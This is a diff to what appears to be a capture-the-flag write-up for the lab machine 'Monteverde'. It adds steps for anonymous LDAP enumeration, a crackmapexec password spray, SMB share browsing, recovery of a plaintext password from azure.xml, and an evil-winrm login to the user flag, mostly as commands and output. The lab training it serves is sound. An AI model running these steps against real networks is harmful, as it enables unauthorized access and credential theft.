@@ -113,6 +113,8 @@ SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\roleary
 SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\smorgan
 ```
 
+
+
 ## Kerberos
 
 Use kerbrute to validate user list:
@@ -148,6 +150,137 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
+
+## LDAP Enumeration:
+
+Extract base naming contexts:
+
+```bash
+ldapsearch -x -H ldap://10.10.10.172 -s base namingcontexts 
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=MEGABANK,DC=LOCAL
+namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
+namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
+namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
+Extracted users:
+
+```bash
+ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" '(objectClass=person)' > ldap-people.txt
+```
+
+Extracted Computers:
+
+```bash
+ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" '(objectClass=computer)' > ldap-computer.txt
+```
+
+## Password Bruteforce
+
+Used `crackmapexec` to brute force smb login:
+
+```bash
+crackmapexec smb 10.10.10.172 -u userslist -p userslist
+
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
+```
+
+Found a set of Credentials: `SABatchJobs:SABatchJobs`
+
+## SMB Enumeration (Pt. 2)
+
+Enumerated SMB shares:
+
+```bash
+crackmapexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares
+
+SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
+SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
+SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
+SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
+SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.10.10.172    445    MONTEVERDE       users$          READ
+```
+
+Looked under `users$` and found a file titled `azure.xml` under the folder `mhope\`:
+
+```bash
+smbclient //10.10.10.172/users$ --user SABatchJobs --password SABatchJobs
+
+smb: \mhope\> ls
+  .                                   D        0  Fri Jan  3 13:41:18 2020
+  ..                                  D        0  Fri Jan  3 13:41:18 2020
+  azure.xml                          AR     1212  Fri Jan  3 13:40:23 2020
+```
+
+In the file `azure.xml`, found a password:
+
+```xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
+    <Props>
+      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
+      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
+      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
+      <S N="Password">4n0therD4y@n0th3r$</S>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+Checked if user `mhope` has WinRM permissions:
+
+```bash
+crackmapexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
+
+WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
+```
+
+Used `evil-winrm` and got the user flag:
+
+```bash
+evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
+
+*Evil-WinRM* PS C:\Users\mhope\Desktop> dir
+
+
+    Directory: C:\Users\mhope\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/29/2024   6:57 AM             34 user.txt
+```
+
+
+
 
 
 
